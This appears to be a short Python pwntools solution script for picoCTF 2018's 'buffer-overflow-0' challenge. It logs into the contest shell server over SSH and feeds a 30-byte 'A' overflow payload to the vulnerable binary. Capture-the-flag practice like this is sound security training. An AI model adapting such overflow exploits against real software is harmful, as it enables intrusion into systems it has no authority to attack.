from pwn import *

session = ssh(host="2018shell4.picoctf.com", user="shizzer", password="XXXXXXXXXXXXXXXXXXXXXX")
shell = session.run("sh")
payload = 'A'*30
shell.sendline("cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d; ./vuln " + payload)
print shell.recvline(timeout=2)
